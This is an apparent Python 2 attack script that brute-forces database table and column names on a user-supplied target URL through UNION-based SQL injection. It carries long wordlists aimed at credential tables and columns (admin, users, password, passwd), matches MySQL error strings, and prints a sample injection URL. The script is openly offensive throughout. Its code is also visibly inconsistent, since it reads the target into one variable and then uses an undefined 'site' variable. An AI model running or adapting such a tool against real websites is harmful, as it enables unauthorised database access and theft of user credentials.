
ERRORS = ["Warning: mysql_fetch_row()","You have an error in your SQL syntax","doesn't exist"]

tables = ["user","users","username","usernames","mysql.user","member","members","admin","administrator","administrators","login","logins","logon","userrights","superuser","control","usercontrol","author","autore","artikel","newsletter","tb_user","tb_users","tb_username","tb_usernames","tb_admin","tb_administrator","tb_member","tb_members","tb_login","perdorues","korisnici","webadmin","webadmins","webuser","webusers","webmaster","webmasters","customer","customers","sysuser","sysusers","sysadmin","sysadmins","memberlist","tbluser","tbl_user","tbl_users","a_admin","x_admin","m_admin","adminuser","admin_user","adm","userinfo","user_info","admin_userinfo","userlist","user_list","user_admin","user_login","admin_user","admin_login","login_user","login_users","login_admin","login_admins","sitelogin","site_login","sitelogins","site_logins","SiteLogin","Site_Login","User","Users","Admin","Admins","Login","Logins","adminrights","news","table","tables","perdoruesit"] 

columns = ["user","username","password","passwd","pass","id","email","emri","fjalekalimi","pwd","user_name","user_password","name","id","user_pass","admin_user","admin_password","user_pass","admin_pass","usern","user_n","users","login","logins","login_user","login_admin","login_username","user_username","user_login","auid","apwd","adminid","admin_id","adminuser","admin_user","adminuserid","admin_userid","adminusername","admin_username","adminname","admin_name","usr","usr_n","usrname","usr_name","usrpass","usr_pass","usrnam","nc","uid","userid","user_id","myusername","mail","emni","logohu","punonjes","kpro_user","wp_users","emniplote","perdoruesi","perdorimi","punetoret","logini","llogaria","fjalekalimin","kodi","emer","ime","korisnik","korisnici","user1","administrator","administrator_name","mem_login","login_password","login_pass","login_passwd","login_pwd","sifra","lozinka","psw","pass1word","pass_word","passw","pass_w","user_passwd","userpass","userpassword","userpwd","user_pwd","useradmin","user_admin","mypassword","passwrd","admin_pwd","admin_pass","admin_passwd","mem_password","memlogin","userid","admin_id","adminid","e_mail","usrn","u_name","uname","mempassword","mem_pass","mem_passwd","mem_pwd","p_word","pword","p_assword","myusername","myname","my_username","my_name","my_password","my_email"] 

proxy = "None"

import urllib2, sys, re, httplib, socket

def fuzzer(i, x, y):
	for i in x: 
		print "[+] Testing:",i
		opener = urllib2.build_opener(proxy_handler)
		source = opener.open(site.replace(y,i.replace("\n",""))).read()
		e = [error for error in ERRORS if re.search(error, source)]
		if len(e) == 0:
    		 	print "\n\t[!]",y.capitalize(),"Found:",i,"\n"
		 	#Uncomment to not test all array
		 	#sys.exit(1)
		else:
			print "[-] Error Received:",e[0]
			
def bothfuzz():
	for table in tables:
		for column in columns:
			print "[+] Table:",table,"Column:",column
			table = table.replace("\n","")
			column = column.replace("\n","")
			opener = urllib2.build_opener(proxy_handler)
			source = urllib2.urlopen(site.replace("TABLE",table).replace("COLUMN",column)).read()
			e = [error for error in ERRORS if re.search(error, source)]
			if len(e) == 0:
    		 		print "\n\t[!] Combo Found:",table,column,"\n"
		 		#Uncomment to not test all array
		 		#sys.exit(1)
			else:
				print "[-] Error Received:",e[0]
			
	


print "\n\tEx: ./script.py www.site.com/index.php?id=-1+UNION+ALL+SELECT+1,COLUMN,3+FROM+TABLE--\n"
print "\t-----------------------------------------------"
	
site00 = raw_input('Enter Your Target : ')
if site00[:7] != "http://":
	site00 = "http://"+site
if site00.find("TABLE") == -1 and site00.find("COLUMN") == -1:
	print "\n[-] Site must contain COLUMN or TABLE\n"
	sys.exit(1)
	
try:
	if proxy != "None":
		print "\n[+] Testing Proxy..."
		h2 = httplib.HTTPConnection(proxy)
		h2.connect()
		print "[+] Proxy:",proxy
		print "[+] Building Handler"
		proxy_handler = urllib2.ProxyHandler({'http': 'http://'+proxy+'/'})
	else:
		print "\n[-] Proxy Not Given"
		proxy_handler = ""
except(socket.timeout):
	print "\n[-] Proxy Timed Out"
	sys.exit(1)
except:
	print "\n[-] Proxy Failed"
	sys.exit(1)

print "\n[+] Tables Loaded:",len(tables)
print "[+] Columns Loaded:",len(columns)
print "[+] Errors Loaded:",len(ERRORS)
if site00.find("TABLE") != -1 and site00.find("COLUMN") == -1:
	print "\n[+] Fuzzing Tables\n"
	fuzzer("table", tables, "TABLE")
if site00.find("TABLE") == -1 and site00.find("COLUMN") != -1:
	print "\n[+] Fuzzing Columns\n"
	fuzzer("column", columns, "COLUMN")
if site00.find("TABLE") != -1 and site00.find("COLUMN") != -1:
	print "\n[+] Fuzzing Tables & Columns\n"
	bothfuzz()
print "\n[-] Done\n"


